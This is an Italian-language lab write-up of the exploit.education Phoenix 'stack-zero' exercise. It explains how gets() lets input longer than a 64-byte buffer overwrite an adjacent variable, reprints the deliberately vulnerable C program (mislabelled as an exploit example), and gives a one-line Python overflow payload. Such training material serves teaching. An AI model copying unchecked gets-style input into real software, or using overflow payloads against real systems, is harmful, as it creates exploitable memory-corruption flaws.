### Descrizione del Codice

Il programma `stack_zero.c` contiene una struttura `locals` con due variabili:
- `buffer`: un array di 64 caratteri.
- `changeme`: una variabile `volatile int`.

Il programma stampa un banner, inizializza `changeme` a 0, e poi legge l'input dell'utente nella variabile `buffer` usando la funzione `gets`.

### Problema di Sicurezza

La funzione `gets` è pericolosa perché non controlla la lunghezza dell'input. Se l'utente inserisce più di 64 caratteri, l'input eccederà la dimensione del buffer e sovrascriverà altre aree di memoria, inclusa la variabile `changeme`.

### Exploit

L'obiettivo dell'exploit è sovrascrivere la variabile `changeme` con un valore diverso da 0. Questo si può fare fornendo un input che eccede i 64 caratteri del buffer.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}

Il codice utilizza la funzione gets, che può accettare input più lunghi della lunghezza del buffer, causando così l'exploit :)

Questo livello richiede solo di cambiare il valore di changeme a un valore diverso da zero, quindi possiamo semplicemente inserire un input casuale che eccede la lunghezza del buffer per sovrascrivere il valore di changeme.

Soluzione:
$ python -c "print 'A'*100" | /opt/phoenix/amd64/stack-zero
